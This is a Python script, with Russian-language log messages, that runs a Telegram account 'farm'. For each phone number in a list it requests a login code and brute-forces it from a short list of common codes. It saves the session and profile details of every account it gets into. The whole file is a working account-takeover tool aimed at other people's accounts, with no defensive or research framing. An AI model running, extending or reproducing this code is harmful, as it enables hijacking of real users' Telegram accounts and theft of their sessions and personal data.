import asyncio
import os
import json
import sys
from datetime import datetime
from pyrogram import Client
from pyrogram.errors import PhoneCodeInvalid, FloodWait
from config import API_ID, API_HASH

SESSION_DIR = "sessions"
DELAY_BETWEEN = 30
COMMON_OTPS = [1234, 12345, 1111, 0000, 123456, 111111]

os.makedirs(SESSION_DIR, exist_ok=True)
os.makedirs("logs", exist_ok=True)
os.makedirs("free_data", exist_ok=True)

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("logs/farm.log", "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {msg}\n")
    print(msg)

def load_phones():
    path = "free_data/free_phones.txt"
    if not os.path.exists(path):
        log("❌ Нет файла free_data/free_phones.txt")
        return []
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

async def try_otp(app, phone, phone_hash):
    for otp in COMMON_OTPS:
        try:
            await app.sign_in(phone, phone_hash, str(otp))
            return True
        except PhoneCodeInvalid:
            continue
    return False

async def create_session(phone):
    safe_phone = phone.replace('+', '').replace(' ', '')
    session_name = os.path.join(SESSION_DIR, f"session_{safe_phone}")
    app = Client(session_name, API_ID, API_HASH, workdir=".")
    
    try:
        await app.connect()
        log(f"📞 Пытаюсь: {phone}")
        sent = await app.send_code(phone)
        
        if await try_otp(app, phone, sent.phone_code_hash):
            me = await app.get_me()
            data = {
                "phone": phone,
                "user_id": me.id,
                "username": me.username or "",
                "first_name": me.first_name or ""
            }
            json_path = f"{session_name}.json"
            with open(json_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            log(f"✅ {phone} → @{me.username or me.first_name}")
            log(f"   Файл: {json_path}")
            return True
        else:
            log(f"❌ {phone}: OTP не подошёл")
            
    except FloodWait as e:
        log(f"⏳ {phone}: флуд, ждём {e.x} сек")
        await asyncio.sleep(e.x)
    except Exception as e:
        log(f"❌ {phone}: {e}")
    finally:
        await app.disconnect()
    return False

async def farm(count=10):
    phones = load_phones()
    if not phones:
        log("❌ Нет номеров. Сначала выполни /generate_phones")
        return
    
    log(f"🚜 Ферма запущена: {count} попыток")
    for i, phone in enumerate(phones[:count]):
        log(f"\n👉 {i+1}/{count}: {phone}")
        await create_session(phone)
        await asyncio.sleep(DELAY_BETWEEN)

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    asyncio.run(farm(count))